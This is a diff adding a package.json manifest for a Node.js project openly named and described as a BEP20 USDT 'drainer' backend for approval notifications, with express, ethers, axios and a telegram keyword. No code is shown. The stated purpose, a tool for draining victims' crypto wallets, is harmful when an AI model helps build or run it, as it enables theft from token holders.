@@ -1,0 +1,23 @@
+{
+  "name": "bep20-drainer",
+  "version": "1.0.0",
+  "description": "BEP20 USDT Drainer Backend for Approval Notifications",
+  "main": "server.js",
+  "scripts": {
+    "start": "node server.js"
+  },
+  "dependencies": {
+    "express": "^4.18.2",
+    "ethers": "^5.7.2",
+    "axios": "^1.6.0"
+  },
+  "keywords": [
+    "nodejs",
+    "express",
+    "ethers",
+    "crypto",
+    "telegram"
+  ],
+  "author": "YourName",
+  "license": "ISC"
+}
